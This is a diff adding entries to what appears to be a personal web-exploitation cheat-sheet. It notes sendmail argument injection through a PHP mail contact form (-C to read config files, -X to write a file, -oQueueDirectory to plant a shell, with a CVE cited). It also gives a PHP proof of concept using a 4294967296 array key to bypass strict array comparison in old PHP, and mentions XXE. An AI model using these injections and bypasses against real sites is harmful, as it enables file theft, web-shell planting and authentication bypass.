@@ -23,4 +23,24 @@ chr(128) - chr(159) (various)
             xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
             }
  -------> warning version(XXE) send data XML
+===============================================
++Read file configure in php
+  -Ccontact.php -X../../tofile -> -X file destination
++Write shell
+  -oQueueDirectory=/../../.. CVE-2016-1003
+=========================================
+bypass array===array with old PHP
+0x100000000 = 4294967296
+
+<?php
+
+parse_str('test[4294967296]=admin&&test[1]=user', $post);
+$test= $post["test"];
+$array = ['admin','user'];
+var_dump($test === $array);
+var_dump($test[4294967296]);
+var_dump($array[0]);
+var_dump($test[4294967296] === $array[0]);
+?>
+===========================================
 
